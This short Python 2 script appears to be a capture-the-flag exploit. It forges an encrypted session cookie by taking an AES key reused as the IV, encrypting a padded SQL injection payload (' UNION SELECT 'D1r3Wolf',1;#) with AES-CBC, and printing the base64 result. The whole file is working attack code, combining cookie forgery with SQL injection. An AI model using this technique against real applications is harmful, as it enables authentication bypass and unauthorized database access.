from requests import session
from base64 import b64encode,b64decode
from Crypto.Cipher import AES
from key import Extract_iv

def Encrypt(S):
	A = AES.new(key,AES.MODE_CBC,key)
	Ct = A.encrypt(S)
	return b64encode(Ct)

key = Extract_iv()

def pad(S):
	return S + '\x00'*( 16-(len(S)%16) )
payload = "' UNION SELECT 'D1r3Wolf',1;#"
payload += "|thisisareallyreallylongstringasfalsfassfasfaasff"
payload = pad(payload)

cookie = Encrypt(payload)

print "[+] cookie :",cookie